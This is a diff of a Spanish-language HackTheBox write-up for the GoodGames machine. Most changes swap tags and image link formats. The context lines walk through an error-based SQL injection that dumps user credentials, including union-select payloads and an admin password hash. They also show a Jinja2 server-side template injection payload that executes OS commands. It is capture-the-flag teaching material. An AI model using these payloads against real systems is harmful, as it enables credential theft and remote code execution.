@@ -6,29 +6,13 @@ categories:
   - HTB
   - Linux
 tags:
-  - Local
-  - File
-  - Inclusion
-  - (LFI)
-  - LFI
-  - to
-  - RCE
-  - "-"
-  - Log
-  - Poisoning
-  - Cracking
-  - ZIP
-  - file
-  - Abusing
-  - VNC
-  - "-"
-  - vncviewer
-  - "[Privilege"
-  - Escalation]
-  - SSH
-  - Bruteforce
+  - Server Side Template Injection (SSTI)
+  - Docker Breakout
+  - SQLI (Error Based)
+  - Hash Cracking Weak Algorithms
+  - Password Reuse
 image:
-  path: /assets/img/Poison/Poison.png
+  path: /assets/img/GoodGames/GoodGames.png
 ---
 
 ## Skills
@@ -109,28 +93,28 @@ Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
 
 Cuando accedemos al `servicio web` vemos esto
 
-![[image_1.png]]
+![](/assets/img/GoodGames/image_1.png)
 
 Si pulsamos arriba a la derecha nos sale este `panel` de `login`
 
-![[image_2.png]]
+![](/assets/img/GoodGames/image_2.png)
 ## Web Exploitation
 
 He `capturado` la `petición` con `Burpsuite` y he efectuado un `SQLI (Sql Inyection)`
 
-![[image_3.png]]
+![](/assets/img/GoodGames/image_3.png)
 
 Una vez `logueados` nos lleva hasta aquí
 
-![[image_4.png]]
+![](/assets/img/GoodGames/image_4.png)
 
 Mediante `Wappalyzer` vemos que está corriendo `Flask` por lo tanto podríamos intentar `modificar` los `datos` del `perfil` y efectuar un `SSTI (Server Side Template Inyection)`
 
-![[image_5.png]]
+![](/assets/img/GoodGames/image_5.png)
 
 Si `pinchamos` arriba a la derecha en el `símbolo` de la `rueda` nos lleva a la siguiente página, lo cual indica que hay `Virtual Hosting`
 
-![[image_6.png]]
+![](/assets/img/GoodGames/image_6.png)
 
 `Añadimos` el `dominio` y el `subdominio` al `/etc/hosts`
 
@@ -147,11 +131,11 @@ ff02::2 ip6-allrouters
 
 Si accedemos de nuevo veremos esto
 
-![[image_7.png]]
+![](/assets/img/GoodGames/image_7.png)
 
 Como no tenemos la `contraseña` del usuario `administrador` no podemos acceder, sin embargo, a través de la `SQLI` vamos a `obtener` las `credenciales`. Lo primero que debemos hacer es `capturar` la `petición` con el `Burpsuite` y `listar` el `número` de `columnas`, esto se puede hacer con un `order by`, si usamos `order by 5` nos da un `error` y si hacemos un `order by 4` no, lo que significa que es un `SQLI Error Based` y que tiene `4 columnas `
 
-![[image_8.png]]
+![](/assets/img/GoodGames/image_8.png)
 
 ```
 email=test%40gmail.com' order by 4-- - &password=test
@@ -159,7 +143,7 @@ email=test%40gmail.com' order by 4-- - &password=test
 
 `Listamos` todas las `bases` de `datos`
 
-![[image_9.png]]
+![](/assets/img/GoodGames/image_9.png)
 
 ```
 email=test%40gmail.com' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- - &password=test
@@ -167,7 +151,7 @@ email=test%40gmail.com' union select 1,2,3,group_concat(schema_name) from inform
 
 `Listamos` las `tablas` de la base de datos `Main`
 
-![[image_10.png]]
+![](/assets/img/GoodGames/image_10.png)
 
 ```
 email=test%40gmail.com' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='main'-- - &password=test
@@ -175,7 +159,7 @@ email=test%40gmail.com' union select 1,2,3,group_concat(table_name) from informa
 
 `Listamos` las `columnas` de la tabla `User`
 
-![[image_11.png]]
+![](/assets/img/GoodGames/image_11.png)
 
 ```
 email=test%40gmail.com' union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='user' AND table_schema='main'-- - &password=test
@@ -183,7 +167,7 @@ email=test%40gmail.com' union select 1,2,3,group_concat(column_name) FROM inform
 
 `Listamos` el `contenido` de la tabla `User`
 
-![[image_12.png]]
+![](/assets/img/GoodGames/image_12.png)
 
 ```
 email=test%40gmail.com' union select 1,2,3,group_concat(name, ' : ',email,' : ',password ) from user-- -  &password=test
@@ -191,27 +175,27 @@ email=test%40gmail.com' union select 1,2,3,group_concat(name, ' : ',email,' : ',
 
 He `obtenido` la contraseña (`2b22337f218b2d82dfc3b6f77e7cb8ec`) del usuario `admin` usando `rainbow tables` [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
 
-![[image_13.png]]
+![](/assets/img/GoodGames/image_13.png)
 
 Como ya tenemos la `contraseña` del usuario `admin` ya podemos acceder a `http://internal-administration.goodgames.htb/login`
 
-![[image_14.png]]
+![](/assets/img/GoodGames/image_14.png)
 
 Ya estamos dentro del `panel administrativo`
 
-![[image_15.png]]
+![](/assets/img/GoodGames/image_15.png)
 
 Pinchamos en `My Profile` y usamos el payload `{{ 7*7 }}` para testear el `SSTI (Server Side Template Inyection)`
 
-![[Pasted image 20240807021436.png]]
+![](/assets/img/GoodGames/image_16.png)
 
 La `web` es `vulnerable` a `SSTI`
 
-![[image_17.png]]
+![](/assets/img/GoodGames/image_17.png)
 
 En `PayloadsAllTheThings` [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) hay muchos `payloads` para `explotar` un `SSTI`. En mi caso voy a usar este para `ejecutar comandos`
 
-![[image_18.png]]
+![](/assets/img/GoodGames/image_18.png)
 
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
